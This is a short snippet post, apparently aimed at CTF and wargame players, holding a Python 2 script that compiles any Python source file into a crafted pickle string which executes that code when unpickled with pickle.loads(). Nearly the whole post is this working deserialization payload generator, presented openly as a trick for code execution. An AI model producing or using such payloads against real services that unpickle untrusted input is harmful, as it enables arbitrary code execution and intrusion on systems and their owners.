# Creating a python pickle from arbitrary code

```python
try:
    import cPickle as pickle
except ImportError:
    import pickle

from sys import argv


def picklecompiler(sourcefile):
    """
    Usually pickle can only be used to (de)serialize objects.
    This tiny snippet will allow you to transform arbitrary python source
    code into a pickle string. Unpickling this string with pickle.loads()
    will execute the given soruce code.
    The trick is actually prettey easy: Usually eval() will only accept
    expressions, thus class and function declarations does not work.
    Using the work-around of code objects (returned by compile()), we can
    execute real python source code :)
    """
    sourcecode = file(sourcefile).read()
    return "c__builtin__\neval\n(c__builtin__\ncompile\n(%sS'<payload>'\nS'exec'\ntRtR." % (pickle.dumps(sourcecode)[:-4],)


def usage():
    print "usage: ./%s file\n\nfile\tfile to compile into a pickle string" % argv[0]


if len(argv) == 2:
    print picklecompiler(argv[1])
else:
    usage()
```

tags: #python #programming #pickle #ctf #wargame 
